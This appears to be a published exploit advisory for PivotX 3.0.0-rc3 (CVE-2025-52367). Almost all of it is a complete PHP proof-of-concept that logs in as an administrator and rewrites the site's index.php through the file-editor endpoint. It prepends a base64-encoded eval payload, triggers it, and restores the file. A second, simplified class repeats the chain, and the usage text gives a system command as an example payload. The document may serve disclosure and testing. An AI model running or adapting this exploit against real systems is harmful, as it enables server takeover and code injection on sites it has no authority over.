@@ -1,0 +1,475 @@
+=============================================================================================================================================
+| # Title     : PivotX 3.0.0 RC 3 authenticated command injection                                                                           |
+| # Author    : indoushka                                                                                                                   |
+| # Tested on : windows 11 Fr(Pro) / browser : Mozilla firefox 145.0.1 (64 bits)                                                            |
+| # Vendor    : https://github.com/pivotx/PivotX                                                                                            |
+=============================================================================================================================================
+
+[+] References :  https://packetstorm.news/files/id/208387/ & 	CVE-2025-52367
+
+[+] Summary : 
+             PivotX content management system versions up to and including 3.0.0-rc3 contain an authenticated remote code execution vulnerability 
+			 that allows administrative users to modify PHP files directly through the web interface, leading to complete system compromise.
+			 
+[+]  POC : 
+
+php poc.php 
+
+<?php
+
+class PivotX_RCE_Exploit {
+    
+    private $target;
+    private $username;
+    private $password;
+    private $base_uri;
+    private $cookies;
+    private $csrf_token;
+    private $base_dir;
+    private $original_content;
+    
+    public function __construct($target, $username, $password, $base_uri = '/PivotX/') {
+        $this->target = rtrim($target, '/');
+        $this->username = $username;
+        $this->password = $password;
+        $this->base_uri = rtrim($base_uri, '/');
+        $this->cookies = [];
+        $this->csrf_token = null;
+        $this->base_dir = null;
+        $this->original_content = null;
+    }
+    
+    private function send_request($method, $endpoint, $data = null, $is_post = false, $is_multipart = false) {
+        $url = $this->target . $this->base_uri . $endpoint;
+        
+        $ch = curl_init();
+        curl_setopt_array($ch, [
+            CURLOPT_URL => $url,
+            CURLOPT_RETURNTRANSFER => true,
+            CURLOPT_TIMEOUT => 30,
+            CURLOPT_FOLLOWLOCATION => true,
+            CURLOPT_COOKIEFILE => '',
+            CURLOPT_USERAGENT => 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
+            CURLOPT_SSL_VERIFYPEER => false,
+            CURLOPT_SSL_VERIFYHOST => false
+        ]);
+        
+        // Preserve cookies between requests
+        if (!empty($this->cookies)) {
+            curl_setopt($ch, CURLOPT_COOKIE, $this->build_cookie_header());
+        }
+        
+        if ($is_post) {
+            curl_setopt($ch, CURLOPT_POST, true);
+            if ($data) {
+                if ($is_multipart) {
+                    curl_setopt($ch, CURLOPT_POSTFIELDS, $data);
+                    curl_setopt($ch, CURLOPT_HTTPHEADER, ['Content-Type: multipart/form-data; boundary=' . $this->generate_boundary()]);
+                } else {
+                    curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query($data));
+                }
+            }
+        } else {
+            if ($data && !$is_post) {
+                $url .= '?' . http_build_query($data);
+                curl_setopt($ch, CURLOPT_URL, $url);
+            }
+        }
+        
+        $response = curl_exec($ch);
+        $http_code = curl_getinfo($ch, CURLINFO_HTTP_CODE);
+        
+        // Save cookies from response
+        if (preg_match_all('/Set-Cookie:\s*([^;]+)/i', $response, $matches)) {
+            foreach ($matches[1] as $cookie) {
+                $parts = explode('=', $cookie, 2);
+                if (count($parts) === 2) {
+                    $this->cookies[$parts[0]] = $parts[1];
+                }
+            }
+        }
+        
+        // Extract pivotxsession cookie for CSRF token
+        if (preg_match('/pivotxsession=([a-zA-Z0-9]+)/', $this->build_cookie_header(), $matches)) {
+            $this->csrf_token = $matches[1];
+        }
+        
+        curl_close($ch);
+        
+        return [
+            'code' => $http_code,
+            'body' => $response
+        ];
+    }
+    
+    private function build_cookie_header() {
+        $cookies = [];
+        foreach ($this->cookies as $name => $value) {
+            $cookies[] = $name . '=' . $value;
+        }
+        return implode('; ', $cookies);
+    }
+    
+    private function generate_boundary() {
+        return '----WebKitFormBoundary' . bin2hex(random_bytes(16));
+    }
+    
+    private function build_multipart_data($fields) {
+        $boundary = $this->generate_boundary();
+        $data = '';
+        
+        foreach ($fields as $name => $value) {
+            $data .= "--{$boundary}\r\n";
+            $data .= "Content-Disposition: form-data; name=\"{$name}\"\r\n\r\n";
+            $data .= "{$value}\r\n";
+        }
+        
+        $data .= "--{$boundary}--\r\n";
+        
+        return [
+            'data' => $data,
+            'boundary' => $boundary
+        ];
+    }
+    
+    public function check() {
+        echo "[*] Checking target...\n";
+        
+        $response = $this->send_request('GET', 'pivotx/index.php');
+        
+        if ($response['code'] !== 200) {
+            return "Unknown: Unexpected response code: " . $response['code'];
+        }
+        
+        if (strpos($response['body'], 'PivotX Powered') === false) {
+            return "Safe: Target is not PivotX";
+        }
+        
+        // Extract version
+        if (preg_match('/PivotX - (\d\.\d\d?\.\d\d?-[a-z0-9]+)/', $response['body'], $matches)) {
+            $version = $matches[1];
+            echo "[*] Detected PivotX version: $version\n";
+            
+            // Check if version is vulnerable (<= 3.0.0-rc3)
+            if (version_compare($version, '3.0.0-rc3', '<=')) {
+                return "Appears: Vulnerable PivotX $version detected";
+            } else {
+                return "Safe: PivotX $version is not vulnerable";
+            }
+        }
+        
+        return "Detected: Could not determine version";
+    }
+    
+    private function login() {
+        echo "[*] Attempting to login...\n";
+        
+        $multipart_data = $this->build_multipart_data([
+            'returnto' => '',
+            'template' => '',
+            'username' => $this->username,
+            'password' => $this->password
+        ]);
+        
+        $response = $this->send_request('POST', 'pivotx/index.php', 
+                                      array_merge(['page' => 'login'], $multipart_data['data']), 
+                                      true, true);
+        
+        // Check for login failure
+        if (strpos($response['body'], 'Incorrect username/password') !== false) {
+            throw new Exception("Login failed - incorrect username/password");
+        }
+        
+        // Check for successful login (should have pivotxsession cookie)
+        if (($response['code'] == 200 || $response['code'] == 302) && 
+            preg_match('/pivotxsession=([a-zA-Z0-9]+)/', $this->build_cookie_header())) {
+            echo "[+] Login successful\n";
+            return true;
+        }
+        
+        throw new Exception("Login failed - unable to get pivotxsession cookie");
+    }
+    
+    private function modify_file($payload) {
+        echo "[*] Modifying index.php file...\n";
+        
+        // First, get the working directory
+        $response = $this->send_request('GET', 'pivotx/index.php', ['page' => 'homeexplore']);
+        
+        if ($response['code'] !== 200 || !preg_match('/basedir=([a-zA-Z0-9]+)/', $response['body'], $matches)) {
+            throw new Exception("Failed to fetch working directory");
+        }
+        
+        $this->base_dir = $matches[1];
+        echo "[*] Base directory: $this->base_dir\n";
+        
+        // Fetch current index.php content
+        $response = $this->send_request('GET', 'pivotx/ajaxhelper.php', [
+            'function' => 'view',
+            'basedir' => $this->base_dir,
+            'file' => 'index.php'
+        ]);
+        
+        if ($response['code'] !== 200) {
+            throw new Exception("Failed to fetch index.php content");
+        }
+        
+        // Extract original content from textarea
+        if (preg_match('/<textarea[^>]*>(.*?)<\/textarea>/is', $response['body'], $matches)) {
+            $this->original_content = html_entity_decode($matches[1]);
+        }
+        
+        if (!$this->original_content) {
+            throw new Exception("Could not find content of index.php");
+        }
+        
+        echo "[*] Original content length: " . strlen($this->original_content) . " bytes\n";
+        
+        // Create malicious payload
+        $encoded_payload = base64_encode($payload);
+        $malicious_content = "<?php eval(base64_decode('$encoded_payload')); ?> " . $this->original_content;
+        
+        // Save malicious content
+        $post_data = [
+            'csrfcheck' => $this->csrf_token,
+            'function' => 'save',
+            'basedir' => $this->base_dir,
+            'file' => 'index.php',
+            'contents' => $malicious_content
+        ];
+        
+        $response = $this->send_request('POST', 'pivotx/ajaxhelper.php', $post_data, true);
+        
+        if ($response['code'] !== 200 || strpos($response['body'], 'Wrote contents to file index.php') === false) {
+            throw new Exception("Failed to insert malicious PHP payload");
+        }
+        
+        echo "[+] Successfully modified index.php with payload\n";
+    }
+    
+    private function trigger_payload() {
+        echo "[*] Triggering payload...\n";
+        
+        $response = $this->send_request('POST', 'index.php', null, true);
+        
+        echo "[+] Payload triggered\n";
+        return $response;
+    }
+    
+    private function restore() {
+        if (!$this->original_content || !$this->base_dir || !$this->csrf_token) {
+            echo "[-] Cannot restore - missing required data\n";
+            return false;
+        }
+        
+        echo "[*] Restoring original content...\n";
+        
+        $post_data = [
+            'csrfcheck' => $this->csrf_token,
+            'function' => 'save',
+            'basedir' => $this->base_dir,
+            'file' => 'index.php',
+            'contents' => $this->original_content
+        ];
+        
+        $response = $this->send_request('POST', 'pivotx/ajaxhelper.php', $post_data, true);
+        
+        if ($response['code'] === 200 && strpos($response['body'], 'Wrote contents to file index.php') !== false) {
+            echo "[+] Original content restored successfully\n";
+            return true;
+        } else {
+            echo "[-] Failed to restore original content\n";
+            return false;
+        }
+    }
+    
+    public function exploit($payload) {
+        try {
+            echo "[*] Starting PivotX RCE exploitation...\n";
+            
+            // Check target first
+            $check_result = $this->check();
+            echo "[*] Check result: $check_result\n";
+            
+            if (strpos($check_result, 'Safe') !== false) {
+                echo "[-] Target is not vulnerable, stopping exploitation\n";
+                return false;
+            }
+            
+            // Login to PivotX
+            $this->login();
+            
+            // Modify index.php with payload
+            $this->modify_file($payload);
+            
+            // Trigger the payload
+            $this->trigger_payload();
+            
+            echo "[+] Exploitation completed\n";
+            return true;
+            
+        } catch (Exception $e) {
+            echo "[-] Exploitation failed: " . $e->getMessage() . "\n";
+            return false;
+        } finally {
+            // Always attempt to restore original content
+            $this->restore();
+        }
+    }
+    
+    public function __destruct() {
+        // Auto-restore on object destruction
+        $this->restore();
+    }
+}
+
+// نسخة مبسطة للاستخدام السريع
+class SimplePivotXExploit {
+    
+    public static function execute($target, $username, $password, $php_code, $base_uri = '/PivotX/') {
+        $target = rtrim($target, '/');
+        $base_uri = rtrim($base_uri, '/');
+        
+        $ch = curl_init();
+        $cookies = [];
+        
+        // Step 1: Login
+        $login_data = http_build_query([
+            'returnto' => '',
+            'template' => '',
+            'username' => $username,
+            'password' => $password
+        ]);
+        
+        curl_setopt_array($ch, [
+            CURLOPT_URL => $target . $base_uri . '/pivotx/index.php?page=login',
+            CURLOPT_POST => true,
+            CURLOPT_POSTFIELDS => $login_data,
+            CURLOPT_RETURNTRANSFER => true,
+            CURLOPT_COOKIEFILE => '',
+            CURLOPT_FOLLOWLOCATION => true
+        ]);
+        
+        $response = curl_exec($ch);
+        
+        // Extract cookies
+        if (preg_match_all('/Set-Cookie:\s*([^;]+)/i', $response, $matches)) {
+            foreach ($matches[1] as $cookie) {
+                $parts = explode('=', $cookie, 2);
+                if (count($parts) === 2) {
+                    $cookies[$parts[0]] = $parts[1];
+                }
+            }
+        }
+        
+        $cookie_header = '';
+        foreach ($cookies as $name => $value) {
+            $cookie_header .= $name . '=' . $value . '; ';
+        }
+        
+        // Step 2: Get base directory
+        curl_setopt_array($ch, [
+            CURLOPT_URL => $target . $base_uri . '/pivotx/index.php?page=homeexplore',
+            CURLOPT_POST => false,
+            CURLOPT_HTTPHEADER => ["Cookie: $cookie_header"]
+        ]);
+        
+        $response = curl_exec($ch);
+        preg_match('/basedir=([a-zA-Z0-9]+)/', $response, $matches);
+        $base_dir = $matches[1] ?? '';
+        
+        if (!$base_dir) {
+            return "[-] Failed to get base directory";
+        }
+        
+        // Step 3: Get original index.php content
+        curl_setopt_array($ch, [
+            CURLOPT_URL => $target . $base_uri . '/pivotx/ajaxhelper.php?function=view&basedir=' . $base_dir . '&file=index.php',
+            CURLOPT_HTTPHEADER => ["Cookie: $cookie_header"]
+        ]);
+        
+        $response = curl_exec($ch);
+        preg_match('/<textarea[^>]*>(.*?)<\/textarea>/is', $response, $matches);
+        $original_content = html_entity_decode($matches[1] ?? '');
+        
+        // Step 4: Inject payload
+        $encoded_payload = base64_encode($php_code);
+        $malicious_content = "<?php eval(base64_decode('$encoded_payload')); ?> " . $original_content;
+        
+        $post_data = http_build_query([
+            'csrfcheck' => $cookies['pivotxsession'] ?? '',
+            'function' => 'save',
+            'basedir' => $base_dir,
+            'file' => 'index.php',
+            'contents' => $malicious_content
+        ]);
+        
+        curl_setopt_array($ch, [
+            CURLOPT_URL => $target . $base_uri . '/pivotx/ajaxhelper.php',
+            CURLOPT_POST => true,
+            CURLOPT_POSTFIELDS => $post_data,
+            CURLOPT_HTTPHEADER => ["Cookie: $cookie_header"]
+        ]);
+        
+        $response = curl_exec($ch);
+        
+        // Step 5: Trigger payload
+        curl_setopt_array($ch, [
+            CURLOPT_URL => $target . $base_uri . '/index.php',
+            CURLOPT_POST => true,
+            CURLOPT_POSTFIELDS => '',
+            CURLOPT_HTTPHEADER => ["Cookie: $cookie_header"]
+        ]);
+        
+        $trigger_response = curl_exec($ch);
+        
+        // Step 6: Restore original content
+        $restore_data = http_build_query([
+            'csrfcheck' => $cookies['pivotxsession'] ?? '',
+            'function' => 'save',
+            'basedir' => $base_dir,
+            'file' => 'index.php',
+            'contents' => $original_content
+        ]);
+        
+        curl_setopt_array($ch, [
+            CURLOPT_URL => $target . $base_uri . '/pivotx/ajaxhelper.php',
+            CURLOPT_POSTFIELDS => $restore_data
+        ]);
+        
+        curl_exec($ch);
+        curl_close($ch);
+        
+        return "[+] Exploitation completed";
+    }
+}
+
+// الاستخدام
+if (php_sapi_name() === 'cli') {
+    
+    if ($argc < 5) {
+        echo "Usage: php " . $argv[0] . " <target_url> <username> <password> <php_code>\n";
+        echo "Example: php " . $argv[0] . " http://localhost admin password \"system('id');\"\n";
+        echo "Example: php " . $argv[0] . " http://localhost admin password \"echo 'Hello World';\"\n";
+        exit(1);
+    }
+    
+    $target = $argv[1];
+    $username = $argv[2];
+    $password = $argv[3];
+    $php_code = $argv[4];
+    
+    // استخدام النسخة الكاملة
+    $exploit = new PivotX_RCE_Exploit($target, $username, $password);
+    $exploit->exploit($php_code);
+    
+    // أو استخدام النسخة المبسطة
+    // $result = SimplePivotXExploit::execute($target, $username, $password, $php_code);
+    // echo $result . "\n";
+}
+
+?>
+
+Greetings to :=====================================================================================
+jericho * Larry W. Cashdollar * LiquidWorm * Hussin-X * D4NB4R * Malvuln (John Page aka hyp3rlinx)|
+===================================================================================================
